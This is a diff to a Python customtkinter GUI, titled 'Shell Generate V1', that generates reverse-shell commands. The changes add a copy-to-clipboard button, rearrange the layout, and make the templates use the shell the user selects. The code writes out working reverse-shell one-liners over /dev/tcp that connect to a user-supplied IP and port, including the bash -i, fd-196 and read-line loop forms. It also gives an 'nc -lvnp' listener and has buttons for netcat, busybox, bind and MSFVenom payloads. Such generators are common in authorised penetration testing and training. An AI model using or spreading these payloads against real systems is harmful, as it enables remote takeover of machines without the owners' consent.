@@ -1,5 +1,5 @@
 import customtkinter as cutk
-# import emoji # Not working at the moment
+import emoji # Not working at the moment
 
 PORT = int()
 IP = str("Your IP")
@@ -7,15 +7,10 @@ SHELL = "bash" # By default is `bash`
 shell_option = ["/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh",
            "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"]
 
-cutk.set_appearance_mode("dark")
-cutk.set_default_color_theme("blue")
-
-app = cutk.CTk()
-app.geometry("1100x1100")
-app.title("Shell Generate V1")
-
-app.grid_rowconfigure(0, weight=1)
-app.grid_columnconfigure(0, weight=1)
+def copy_to_clipboard():
+    app.clipboard_clear()
+    app.clipboard_append(shell_label.cget("text"))
+    app.update()  # necessary to update the clipboard contents
 
 def set_shell(shell_from_user):
     global SHELL
@@ -31,22 +26,32 @@ def get_the_port_from_user(event):
         listent_label.configure(text=f"sudo nc -lvnp {PORT}")
     else:
         listent_label.configure(text=f"nc -lvnp {PORT}")
-    shell_label.configure(text=f"\U0001F603 bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
+    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 def get_the_ip_from_user(event):
     global IP
     IP = ip_entry.get()
     print(f"IP input {IP}")
-    shell_label.configure(text=f"\U0001F603 bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
+    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 def ret_bash_i():
-    shell_label.configure(text=f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
+    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 def ret_bash_196():
-    shell_label.configure(text=f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; bash <&196 >&196 2>&196")
+    shell_label.configure(text=f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196")
 
 def ret_bash_read_line():
     shell_label.configure(text=f"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done")
+
+cutk.set_appearance_mode("dark")
+cutk.set_default_color_theme("blue")
+
+app = cutk.CTk()
+app.geometry("900x600")
+app.title("Shell Generate V1")
+
+app.grid_rowconfigure(0, weight=1)
+app.grid_columnconfigure(0, weight=1)
 
 main_frame = cutk.CTkFrame(master=app) 
 main_frame.grid(pady=30,padx=30, row=0, column=0, sticky='nsew')
@@ -87,6 +92,8 @@ bind_shell = cutk.CTkButton(master=shell_frame, text="Bind",fg_color="gray", hov
 bind_shell.grid(row=0, column=1)
 MSF_venom = cutk.CTkButton(master=shell_frame, text="MSFVenom",fg_color="gray", hover_color="blue", corner_radius=10)
 MSF_venom.grid(row=0, column=2)
+
+
 scrollable_frame = cutk.CTkScrollableFrame(master=shell_frame, width=150, height=150)
 scrollable_frame.grid()
 
@@ -100,11 +107,17 @@ nc_e = cutk.CTkButton(master=scrollable_frame, text=f"nc -e", fg_color="gray", h
 busybox = cutk.CTkButton(master=scrollable_frame, text=f"busybox", fg_color="gray", hover_color="red")
 nc_c = cutk.CTkButton(master=scrollable_frame, text=f"nc -c", fg_color="gray", hover_color="red")
 
-shell_label = cutk.CTkLabel(master=shell_frame, text="Enter your IP and Port PLS!!! 😄", font=("Aria", 20))
-shell_label.grid(row=1, column=2)
+copy_frame = cutk.CTkFrame(master=shell_frame, corner_radius=10,)
+copy_frame.grid(column=2, row=1,rowspan=3,columnspan=3, sticky='ew')
+copy_frame.grid_columnconfigure(0, weight=1)
+shell_label = cutk.CTkLabel(master=copy_frame, text="Enter your IP and Port PLS!!! 😄", font=("Aria", 20), wraplength=400)
+shell_label.grid(row=0, column=0)
+
+copy_button = cutk.CTkButton(main_frame, text="Copy to Clipboard", command=copy_to_clipboard)
+copy_button.grid( row=3, column=1, pady=(10, 0), sticky='ew')
 
 option_menu = cutk.CTkOptionMenu(master=shell_frame, values=shell_option, command=set_shell)
-option_menu.grid(row=3, column=3, pady=20, padx=20)
+option_menu.grid(row=3, column=3, pady=20, padx=20) 
 
 bash_i.grid(padx=3, pady=3)
 bash_196.grid(padx=3, pady=3)
@@ -116,4 +129,7 @@ nc_e.grid(padx=3, pady=3)
 busybox.grid(padx=3, pady=3)
 nc_c.grid(padx=3, pady=3)
 
+
+#meme_label = cutk.CTkLabel(master=main_label, text="Intrebari mai sunt 3..2..1")
+#meme_label.grid(row=3, column=3)
 app.mainloop()
